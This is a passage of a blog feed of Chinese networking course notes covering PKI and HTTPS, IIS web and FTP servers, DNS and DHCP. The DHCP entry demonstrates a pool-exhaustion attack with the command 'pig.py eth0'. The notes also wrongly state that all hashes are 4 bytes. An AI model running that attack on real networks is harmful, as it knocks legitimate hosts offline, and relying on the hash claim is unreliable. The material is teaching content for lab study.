创建GPO，或者在已有的组策略对象中选择组策略链接</p><p>14、编辑组策略：对准策略右键编辑 -》 用户配置 （策略就近原则），使用服务器资源要启动共享，并设置NTFS权限！</p></blockquote><p>实验结果总结：主机要想在DNS服务器上注册，必须要配置DNS服务器！可以用员工账号去加入域。活动目录中的计算机名是主机的计算机名，DNS中的主机名也是计算机名。</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10、PKI（公钥基础设施）</title>
      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/"/>
      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="PKI（公钥基础设施）"><a href="#PKI（公钥基础设施）" class="headerlink" title="PKI（公钥基础设施）"></a>PKI（公钥基础设施）</h2><h3 id="PKI概述"><a href="#PKI概述" class="headerlink" title="PKI概述"></a>PKI概述</h3><p>Public Key Infrastructure(<em>PKI</em>),中文叫做公开密钥基础设施</p><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p><strong>PKI基础设施的组成</strong>：公钥加密技术、数字证书、CA、RA。</p><p><strong>信息安全三要素/四要素</strong>：机密性、完整性、身份验证（可用性？）、（不可否认性）</p><p><strong>使用到PKI技术的IT领域</strong>：https（s:SSL/pki）、VPN–IPsecVPN、VPN–部分远程访问VPN</p><h3 id="公钥加密技术"><a href="#公钥加密技术" class="headerlink" title="公钥加密技术"></a>公钥加密技术</h3><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p>算法概念：x+5=y，x原数据、y密文、5密钥。</p><h4 id="加密算法分类"><a href="#加密算法分类" class="headerlink" title="加密算法分类"></a>加密算法分类</h4><h5 id="1、对称加密算法：加密和解密的密钥一致。"><a href="#1、对称加密算法：加密和解密的密钥一致。" class="headerlink" title="1、对称加密算法：加密和解密的密钥一致。"></a>1、对称加密算法：加密和解密的密钥一致。</h5><p><strong>优点</strong>：加密速度快；<strong>缺点</strong>：密钥容易被截获</p><p><strong>常见算法</strong>：DES、3DES、<strong>AES</strong>。Data/Advanced Encryption Standard，AES最常见。</p><h5 id="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"><a href="#2、非对称加密算法：加密和解密的密钥不同，称为公私钥。" class="headerlink" title="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"></a>2、非对称加密算法：加密和解密的密钥不同，称为公私钥。</h5><p><strong>公私钥</strong>：非对称加密算法自己产生一对公私钥，不需要双方协商。（公钥私钥孪生，不可互相逆推）双方公钥明文发送，私钥自我保留。</p><p><strong>优点</strong>：安全（完整性、机密性）；<strong>缺点</strong>：效率低、速度慢。</p><p><strong>流程</strong>：<u>双方各持有RSA公私钥，然后交换公钥。使用对方公钥加密并使用哈希算法计算密文指纹，再使用私钥加密指纹。最后将加密指纹和密文共同发送。</u></p><p><u>私钥加密指纹，中间人可截取使用公钥破译但破译无意义，由于私钥完全隐私所以无法伪造指纹，以成功保证数据传输的完整性和机密性。</u></p><p><a href="https://imgchr.com/i/UCEIsS"><img src="https://s1.ax1x.com/2020/07/06/UCEIsS.png" alt="UCEIsS.png"></a></p><p><strong>第三方公证机构（证书颁发发机构 CA认证/RA注册审批）</strong>：为了防止中间人在一开始就伪装通信双方公钥进行消息截取，就要寻求<u>公证机构</u>的验证帮助。服务器在封闭安全的环境内向<u>公证机构</u>发送自己的域名、IP、公钥等信息，<u>公证机构</u>会对服务器的信息生成一个钢印（加密指纹）（通过哈希形成指纹然后使用私钥进行RSA加密），然后生成一个服务器数字证书（信息（域名、IP、公钥等信息）+钢印）发送给服务器。</p><p>后面服务器和客户机进行通信时，先发送数字证书给客户机，客户机使用公证机构的公钥对钢印进行RSA解密，得到HASH钢印指纹，再对除钢印以外的证书内容进行HASH计算得到HASH普通指纹，然后用普通指纹和钢印指纹进行对比，如果相同，则说明服务器是通过公证机构认证的、安全的服务器。</p><p><u>世界上比较出名的根证书颁发机构已经内置在了浏览器中。</u></p><p><a href="https://imgchr.com/i/UCVawQ"><img src="https://s1.ax1x.com/2020/07/06/UCVawQ.png" alt="UCVawQ.png"></a></p><p><strong>CA（证书颁发机构）</strong>：接受申请，制作<u>数字证书</u>，颁发<strong>数字证书</strong>。</p><p><strong>数字证书</strong>：用于公正并保证公钥的合法性</p><p><strong>数字证书格式</strong>：遵循X.509标准。</p><p><strong>证书内容</strong>：使用者的公钥、使用者的标识信息（域名、IP、名称、电子邮箱地址）、证书有效期、颁发者的标识信息（公证机构）、颁发者的数字签名（钢印）。</p><p><strong>常见算法</strong>：RSA（HTTPS用的算法）、DH（迪菲·赫尔曼发明）、</p><h5 id="3、哈希算法："><a href="#3、哈希算法：" class="headerlink" title="3、哈希算法："></a>3、哈希算法：</h5><p>常见的哈希算法：MD5、SHA</p><p>哈希加密算法不可逆。无论数据多大加密后都是4字节的哈希值（hash值、指纹、摘要）。<strong>主要用于计算数据是否正确与完整。</strong></p><h3 id="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"><a href="#实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）" class="headerlink" title="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"></a>实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）</h3><blockquote><p>实验目标：部署HTTPS服务器</p><p>实验环境：windows2008作为HTTPS服务器（10.1.1.2）、win7作为客户机（10.1.1.1），桥接vmnet1。</p><p>实验步骤：</p><p>1、还原快照、桥接、配置网络地址信息、禁用再启用（清除ipv6缓存信息）</p><p>2、安装IIS，windows2008服务安装包已经内置在系统中。计算机右键 -》服务器管理 -》添加角色 -》Web服务器（IIS） -》安装。<strong>不要动IIS自带的默认网站！默认网站会被CA装载服务网页！</strong></p><p>3、准备网站文件夹flower在D盘，在Web服务器中添加网站，<strong>绑定</strong>域名、IP、子网掩码，先使用的是http协议（因为暂时无法使用https）。设置默认文档。</p><p>4、在IIS中安装DNS角色。然后使用客户机尝试访问网站。</p><p>5、安装CA组件：计算机右键 -》服务器管理 -》添加角色 -》Active Directory证书颁发机构-》角色服务再选择证书颁发机构Web注册 -》修改CA的公用名称（CAzongju）-》安装，去Web服务器给注册网站绑定域名（<a href="http://www.ca.com).dns服务器域名解析.客户机访问www.ca.com/certsrv%E6%B5%8B%E8%AF%95%E3%80%82">www.ca.com）。DNS服务器域名解析。客户机访问www.ca.com/certsrv测试。</a></p><p>6、在windows2008的IIS中，写证书申请单：左键总服务器-》服务器证书-》创建证书申请-》通用名称必须和网站域名相同-》生成证书申请txt文件（base64编码）</p><p>7、向CA提交证书申请：在服务器上访问CA的注册网站（防止网页信任弹窗的方法：降低windows2008服务器的安全级别：服务器管理器-》配置IE EXC-》禁用） -》 申请证书 -》高级证书申请 -》使用base64编码申请 -》 提交</p><p>8、CA服务器审核并颁发证书：管理工具-》证书颁发机构-》挂起的申请-》右键所有任务、颁发。</p><p>9、服务器安装证书：服务器去证书申请网站-》查看挂起的申请证书-》下载证书。总Web服务器-》服务器证书-》完成证书申请-》写一个好记名称flower</p><p>10、服务器使用证书：选择Web服务器中的网页 -》 添加网页绑定 -》选择https类型并且选择刚刚安装的证书。</p><p>11、客户机使用https访问flower网站进行初步测试，会显示证书无效，但可继续访问。</p><p>12、客户机浏览器添加信任我们的证书机构（获得证书公钥）：去证书机构注册网站上下载当前CA机构证书。浏览器选项-》内容-》证书-》受信任的根证书颁发机构-》导入-》导入我们的CA机构证书。</p><p>或者直接双击CA机构证书-》安装证书-》浏览选择安装到受信任的根证书颁发机构。</p><p>13、禁用服务器的http访问，只允许https访问：Web服务器flower-》SSL设置-》选中要求SSL-》点击右侧的应用。然后验证是否成功。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9、部署windows2008</title>
      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/"/>
      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/</url>
      
        <content type="html"><![CDATA[<h3 id="环境准备：部署windows2008"><a href="#环境准备：部署windows2008" class="headerlink" title="环境准备：部署windows2008"></a>环境准备：部署windows2008</h3><p>选择enterprise完整版本。自定义安装</p><p>1、新建文件夹windows2008-1，新建虚拟机（单个文件，稍后安装操作系统），插入ISO镜像，分配1G内存。</p><p>2、开机分区，20G给C盘，D盘进入系统再分。</p><p>3、安装完毕2008需要先设置高强度密码123.com</p><p>4、设置以后不弹出两个讨厌的对话框</p><p>5、调出桌面图标：开始-》搜索ion/图标-》显示或隐藏桌面图标</p><p>6、分区D盘格式化：计算机-》管理-》存储-》磁盘存储</p><p>7、关闭防火墙和自动更新</p><p>8、安装vmtools重启</p><p>9、搜索文件夹选项，关闭隐藏文件夹拓展名 -》 神秘的东方力量，重启验证</p><p>10、关机做快照</p><hr><p>查看Windows已打补丁信息：<code>systeminfo</code></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、IIS容器搭建——FTP服务器</title>
      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS容器搭建——FTP服务器"><a href="#IIS容器搭建——FTP服务器" class="headerlink" title="IIS容器搭建——FTP服务器"></a>IIS容器搭建——FTP服务器</h2><h3 id="1、FTP服务器概述"><a href="#1、FTP服务器概述" class="headerlink" title="1、FTP服务器概述"></a>1、FTP服务器概述</h3><p>File Transfor Protocol === 文件传输服务器</p><p>FTP服务器功能与SMB文件共享服务器（port445）几乎相同。</p><p>一般来说 公司内部文件共享使用SMB服务、对外文件共享使用FTP服务器</p><h3 id="2、FTP协议端口"><a href="#2、FTP协议端口" class="headerlink" title="2、FTP协议端口"></a>2、FTP协议端口</h3><p>20端口：数据端口（默认不开启，只有在传输数据时才打开使用，传输完毕，端口关闭）</p><p>21端口：控制端口（身份验证、指令传送等）</p><p><code>ftp://IP地址</code></p><h3 id="3、使用IIS容器发布部署FTP服务器"><a href="#3、使用IIS容器发布部署FTP服务器" class="headerlink" title="3、使用IIS容器发布部署FTP服务器"></a>3、使用IIS容器发布部署FTP服务器</h3><blockquote><p>1、服务器和客户机配置IP、子网掩码、ping通，服务器安装FTP服务器插件</p><p>2、默认FTP站点 C:\Inetpub\ftproot, 建议禁用默认的FTP站点</p><p>3、新建FTP文件夹（笔记、课件、上传作业）、创建FTP站点，设置FTP权限建议全选。<strong>（FTP权限和NTFS权限取交集）</strong></p><p>4、设置文件夹NTFS权限，测试FTP登录是否需要账户密码，如果仍然不需要，去服务器中将FTP站点属性的安全账户中把允许匿名连接关闭。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、IIS容器搭建——WEB服务器</title>
      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS容器搭建——WEB服务器"><a href="#IIS容器搭建——WEB服务器" class="headerlink" title="IIS容器搭建——WEB服务器"></a>IIS容器搭建——WEB服务器</h2><h3 id="1、Web服务器概述"><a href="#1、Web服务器概述" class="headerlink" title="1、Web服务器概述"></a>1、Web服务器概述</h3><p>web服务器一般也称为网页服务器、HTTP服务器。</p><p>通过Web服务器可以将我们做好的Web通过网络发布出去，让客户机通过网络可以远程访问。例如：京东Web服务器、百度Web服务器。</p><h3 id="2、协议"><a href="#2、协议" class="headerlink" title="2、协议"></a>2、协议</h3><p>前面已经学过：SMB协议、telnet协议、RDP协议、DHCP协议等。</p><p>Web服务器使用的协议是：<strong>http协议、https协议</strong>。</p><h3 id="3、HTTP-S协议端口号"><a href="#3、HTTP-S协议端口号" class="headerlink" title="3、HTTP/S协议端口号"></a>3、HTTP/S协议端口号</h3><p>http：80；https：443</p><h3 id="4、Web容器（Http服务软件）"><a href="#4、Web容器（Http服务软件）" class="headerlink" title="4、Web容器（Http服务软件）"></a>4、Web容器（Http服务软件）</h3><p><strong>微软：IIS</strong>（IIS服务软件额可以发布Web服务器、发布FTP服务器）</p><p><strong>Linux：Apache、Tomcat、nginx</strong>等</p><p><strong>第三方学习用：phpstudy、XAMPP、WAMP</strong>等等。</p><h3 id="5、服务器部署Web容器"><a href="#5、服务器部署Web容器" class="headerlink" title="5、服务器部署Web容器"></a>5、服务器部署Web容器</h3><blockquote><p>1、桥接客户机、服务器，配置IP、子网掩码。ping测试连通性</p><p>2、Windows2003光盘中“应用程序服务器”安装“IIS信息服务”的“万维网服务”插件。验证80端口是否打开。（安装报错的原因是光盘默认是D盘，但电脑中存在D盘，导致找不到光盘中的内容）</p><p>３、万维网服务管理－》默认网站属性－》主目录　找到IIS默认发布好的网页路径：C:\inetpub\wwwroot ，IIS提供的默认网站有漏洞，所以建议-》停止默认网站。停止后，网页服务器没有发布的网页了，再次查看发现80端口自动关闭了。</p><p>4、自定义新建发布网站，网页路径不要放在C盘！文件夹名不允许中文。</p><p>创建网页文件夹：D盘下建立文件夹-》两个html网页，一个网页超链接另一个；</p><p>发布网页：右键网页服务器-》新建网页-》描述是名称随便-》IP和端口号绑定-》选择发布网站文件夹并允许匿名访问网站-》访问权限读取即可                             </p><p>设置默认文档（首页s）：访问IP端口号自动首先打开的网页。网站属性-》文档-》添加默认文档</p><p>5、发布第二个网站：例如hr系统，发布好之后发现自动停止状态（80端口已经占用），改变端口，使用客户机尝试访问。（不要忘记设置默认文档）</p><p>6、发布第三个网站：端口8080（常见）</p><p>7、将baidu和flower绑定同一个端口号提供服务（hosts文件代替DNS服务器）。</p><p><strong>一个网页服务器发布多个网页同时同一个端口的方法，就是设置网页的高级网站标识，标识方式除了IP、端口号还需要主机头值（全限定域名）。设置好后，客户机需要通过域名访问，才能访问到对应的网页。（原理猜想：浏览器在通过DNS解析向服务器发送http请求时，会将客户机的访问域名也包括在数据包中，Web服务器就可以通过客户机的访问域名来给客户机返回网页了）</strong></p><p>8、发布两个动态网页：网站访问权限要勾选运行脚本、Web服务拓展开启Active Server Pages（ASP）。</p></blockquote><h3 id="6、网站类型"><a href="#6、网站类型" class="headerlink" title="6、网站类型"></a>6、网站类型</h3><h4 id="1）静态网站：无数据库操作"><a href="#1）静态网站：无数据库操作" class="headerlink" title="1）静态网站：无数据库操作"></a>1）静态网站：无数据库操作</h4><h4 id="2）动态网站：有数据库操作"><a href="#2）动态网站：有数据库操作" class="headerlink" title="2）动态网站：有数据库操作"></a>2）动态网站：有数据库操作</h4><p>前端和数据库连接的中间件：php、asp、python 。</p><p>微软IIS只支持：静态网站 + asp、sqlserver。</p><p>LAMP：Linux + apache + mysql + php; 静态网站 + php + mysql</p><p>WAMP：Windows + apache + mysql + php</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、DNS服务器部署与安全</title>
      <link href="/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS服务器部署与安全"><a href="#DNS服务器部署与安全" class="headerlink" title="DNS服务器部署与安全"></a>DNS服务器部署与安全</h2><h3 id="1、DNS"><a href="#1、DNS" class="headerlink" title="1、DNS"></a>1、DNS</h3><p>Domain Name Service 域名服务</p><p>作用：为客户机提供域名解析服务（域名 –》IP地址）</p><h3 id="2、域名组成"><a href="#2、域名组成" class="headerlink" title="2、域名组成"></a>2、域名组成</h3><h4 id="域名组成概述"><a href="#域名组成概述" class="headerlink" title="域名组成概述"></a>域名组成概述</h4><p><strong>域名</strong>：如<a href="http://www.sina.com是一个域名,但严格意义来讲/">www.sina.com是一个域名，但严格意义来讲</a> sina.com 才被称为域名（全球唯一），www是主机名，可以随意起。比如blog.sina.com、nba.sina.com等等。</p><p><strong>全限定域名FQDN</strong>：主机名+域名 被称为FQDN(Fully Qualified Domain Name)全限定域名。</p><p><strong>比较出名的域名购买机构</strong>：万网。（购买域名需要备案、购买后可以注册DNS）</p><h4 id="域名组成"><a href="#域名组成" class="headerlink" title="域名组成"></a>域名组成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com.</span><br><span class="line">二级域名.一级域名.顶级域名 根域</span><br></pre></td></tr></table></figure><h3 id="3、DNS服务器监听端口"><a href="#3、DNS服务器监听端口" class="headerlink" title="3、DNS服务器监听端口"></a>3、DNS服务器监听端口</h3><p>DNS服务监听端口：<strong>53</strong></p><h3 id="4、客户机处理域名请求的顺序"><a href="#4、客户机处理域名请求的顺序" class="headerlink" title="4、客户机处理域名请求的顺序"></a>4、客户机处理域名请求的顺序</h3><p>1、查找本地DNS缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;displaydns   查询DNS缓存</span><br><span class="line">ipconfig &#x2F;flushdns     清空刷新DNS缓存</span><br></pre></td></tr></table></figure><p>2、查询hosts文件（本地解析文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><strong>host文件中的内容会自动更新到本地DNS缓存内容，</strong>所以本地查询DNS解析的优先级hosts &gt; 本地DNS缓存。</p><p>3、查找不到就请求DNS服务器。</p><h3 id="5、DNS服务器处理域名请求的顺序"><a href="#5、DNS服务器处理域名请求的顺序" class="headerlink" title="5、DNS服务器处理域名请求的顺序"></a>5、DNS服务器处理域名请求的顺序</h3><p>1、DNS服务器高速缓存</p><p>2、DNS服务器区域配置文件</p><p>3、DNS转发器 / 根域（13个根域）迭代查询</p><p><img src="https://s1.ax1x.com/2020/06/02/tNIXGQ.png" alt="tNIXGQ.png"></p><h3 id="6、DNS服务器解析域名过程"><a href="#6、DNS服务器解析域名过程" class="headerlink" title="6、DNS服务器解析域名过程"></a>6、DNS服务器解析域名过程</h3><p>1、客户机 ——》 本地DNS服务器 、本地DNS服务器 —–》 DNS转发器 <strong>递归查询</strong></p><ul><li>缓存中是否有此域名</li><li>本地区域解析文件是否存在此域名表</li><li>如果不存在，则需要委托<strong>DNS转发器</strong>请求根域DNS服务器或者直接自己请求<strong>根域DNS服务器</strong>开始逐层迭代查询DNS服务器，但对用户来说本地DNS服务器与其他DNS服务器迭代查询的过程是屏蔽的，所以客户机的视角是递归查询。</li></ul><p>2、本地DNS服务器 ——–》 其他DNS服务器 <strong>迭代查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本地DNS服务器在本地查询不到请求的域名，则会从根域DNS服务器逐层向上迭代反馈查询DNS服务器，直到查到域名对应IP地址返回给本地DNS服务器。</span><br><span class="line"></span><br><span class="line">例如:Www.baidu.com</span><br><span class="line">本地DNS服务器 ------&gt; .根域 返回一个 .com DNS服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; .com 域名服务器 返回一个baidu.com DNS域名服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; baidu.com 域名服务器，直接返回www.baidu.com 的IP地址</span><br><span class="line">最终以迭代的形式完成查询，本地DNS服务器缓存并发送给客户机。</span><br></pre></td></tr></table></figure><h3 id="7、DNS服务器部署过程"><a href="#7、DNS服务器部署过程" class="headerlink" title="7、DNS服务器部署过程"></a>7、DNS服务器部署过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、给DNS服务器先配上IP、子网掩码、网关，使其有IP可被客户机找到并且具有找根域DNS服务器的上网能力。</span><br><span class="line">2、windows2003服务器安装DNS插件，发现53端口开启。</span><br><span class="line">3、配置DNS区域，正向查找区域：域名-》IP地址 ； 反向查找区域：IP地址-》域名</span><br><span class="line">例如配置baidu.com区域，然后在区域中新建主机。</span><br><span class="line">4、nslookup 域名 解析IP，测试是否成功。 ping命令解析域名会首先询问本地DNS缓存和hosts、然后再询问服务器。因此会出现缓存更新不及时的状况，此时需要刷新DNS缓存。nslookup不会出现此原因使因为nslookup直接询问DNS服务器请求解析。</span><br><span class="line">5、在区域中新建别名Aliases，设置别名Aliases指向某个域名。</span><br><span class="line">6、服务器属性中添加DNS转发器。</span><br><span class="line">7、当DNS服务器去根域服务器解析域名时，会将域名对应IP地址在服务器缓存（查看--》高级--》缓存的查找，右键可以清除缓存）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、DHCP服务器部署与安全</title>
      <link href="/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
      <url>/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="DHCP服务器部署与安全"><a href="#DHCP服务器部署与安全" class="headerlink" title="DHCP服务器部署与安全"></a>DHCP服务器部署与安全</h2><h3 id="1、DHCP服务器作用"><a href="#1、DHCP服务器作用" class="headerlink" title="1、DHCP服务器作用"></a>1、DHCP服务器作用</h3><p>动态主机配置协议（Dynamic Host Configure Protocol）自动为客户机分配IP地址。</p><h3 id="2、DHCP优点"><a href="#2、DHCP优点" class="headerlink" title="2、DHCP优点"></a>2、DHCP优点</h3><p>减少网络配置工作量、自动分配地址可以避免IP冲突、提高网段中地址利用率。</p><h3 id="3、DHCP相关概念"><a href="#3、DHCP相关概念" class="headerlink" title="3、DHCP相关概念"></a>3、DHCP相关概念</h3><ul><li>地址池/作用域：（IP、子网掩码、网关、DNS、租期）</li><li>DHCP协议端口是 67/68 — <code>netstat -an</code></li></ul><h3 id="4、DHCP原理-工作过程-如何工作"><a href="#4、DHCP原理-工作过程-如何工作" class="headerlink" title="4、DHCP原理/工作过程/如何工作"></a>4、DHCP原理/工作过程/如何工作</h3><p>DHCP租约过程，分为4个步骤：</p><p><a href="https://blog.csdn.net/wuruixn/article/details/8282554">https://blog.csdn.net/wuruixn/article/details/8282554</a></p><h4 id="1）客户机发送DHCP-Discovery广播包"><a href="#1）客户机发送DHCP-Discovery广播包" class="headerlink" title="1）客户机发送DHCP Discovery广播包"></a>1）客户机发送DHCP Discovery广播包</h4><p>客户机广播请求IP地址，发送DHCP Discovery广播包，广播包包含了MAC地址。（MAC地址是每个PC网卡上全球唯一的物理地址）</p><h4 id="2）DHCP服务器响应DHCP-Offer广播包"><a href="#2）DHCP服务器响应DHCP-Offer广播包" class="headerlink" title="2）DHCP服务器响应DHCP Offer广播包"></a>2）DHCP服务器响应DHCP Offer广播包</h4><p>服务器响应并提供IP地址发送一个DHCP Offer广播包响应无IP地址客户机。</p><h4 id="3）客户机选择一个IP地址并发送DHCP-Request广播包"><a href="#3）客户机选择一个IP地址并发送DHCP-Request广播包" class="headerlink" title="3）客户机选择一个IP地址并发送DHCP Request广播包"></a>3）客户机选择一个IP地址并发送DHCP Request广播包</h4><p>客户机收到了DHCP服务器发回的响应IP包，并选择好IP地址后再发送一个DHCP Request广播包，声明自己的IP选择。</p><h4 id="4）DHCP服务器发送DHCP-ACK广播包"><a href="#4）DHCP服务器发送DHCP-ACK广播包" class="headerlink" title="4）DHCP服务器发送DHCP ACK广播包"></a>4）DHCP服务器发送DHCP ACK广播包</h4><p>服务器收到Request广播包后，发送给客户机一个确认广播包，表示自己已经确认租约，并且广播包中提供给客户机网卡详细参数：IP地址、子网掩码、网关地址、DNS地址、租期。并且维护DHCP服务器的租约表，表示地址池中少一个地址。</p><h3 id="5、DHCP续约"><a href="#5、DHCP续约" class="headerlink" title="5、DHCP续约"></a>5、DHCP续约</h3><p>当50%时间过后，客户机会再次发送DHCP Request包进行续约，如服务器无响应，则继续使用并在87.5%时间过后再次发送DHCP Request包进行续约，如仍然无响应，则释放IP地址，重新发送DHCP Discovery广播包来获取IP地址。</p><p>获得服务器响应则重新与新的DHCP租约，如果无服务器响应则自动分配169.254.x.x/16IP地址（全球统一无效地址），用于临时内网通信。</p><h3 id="6、潜在漏洞"><a href="#6、潜在漏洞" class="headerlink" title="6、潜在漏洞"></a>6、潜在漏洞</h3><ul><li><p>资源耗尽漏洞：客户机不断伪装MAC地址，不断请求IP地址，耗尽DHCP服务器的地址池，使DHCP服务器地址被占满。</p><p>防御：在交换机（管理型）的端口上做静态MAC地址绑定</p></li><li><p>伪装DHCP服务器，分配错误的IP地址：开启67/68端口，伪装成DHCP服务器，给客户机分配错误的IP地址，客户机无法联网。</p><p>防御：在交换机（管理型），除合法的DHCP服务器所在的接口外，全部设置为禁止发送DHCP OFFER包</p></li></ul><h3 id="7、DHCP服务器部署"><a href="#7、DHCP服务器部署" class="headerlink" title="7、DHCP服务器部署"></a>7、DHCP服务器部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows2003部署DHCP服务器</span><br><span class="line">1、首先设置DHCP服务器的IP地址，然后在光盘中安装DHCP服务组件，安装好后会发现端口67&#x2F;68已经自动开启。</span><br><span class="line">2、创建地址池：开始-》管理工具-》DHCP-》右键新建作用域（设置IP范围，可以排除保留IP；“保留”可以永久固定一个IP地址给一个MAC地址）。</span><br><span class="line">3、给地址池配置DNS和网关地址。</span><br><span class="line">4、客户机首先取消VMware自带的DHCP服务器(虚拟网络编辑器)。</span><br><span class="line">5、将IP地址设置为自动获取检验DHCP服务器有没有成功部署。</span><br><span class="line">可以使用ipconfig &#x2F;release 释放IP</span><br><span class="line">       ipconfig &#x2F;renew重新获取IP地址</span><br></pre></td></tr></table></figure><h3 id="8、DHCP资源耗尽攻击演示"><a href="#8、DHCP资源耗尽攻击演示" class="headerlink" title="8、DHCP资源耗尽攻击演示"></a>8、DHCP资源耗尽攻击演示</h3><blockquote><p>实验环境：Kali</p><p>软件：pig.py（kali自带）、Yersinia是一款底层协议攻击入侵检测工具，能实施针对多种网络协议的多种攻击。</p><p><a href="https://cloud.tencent.com/developer/article/1197597">https://cloud.tencent.com/developer/article/1197597</a></p></blockquote><p><code>pig.py eth0 </code> 不断在eth0网卡发送假的discovery包、Request包，实现资源耗尽攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
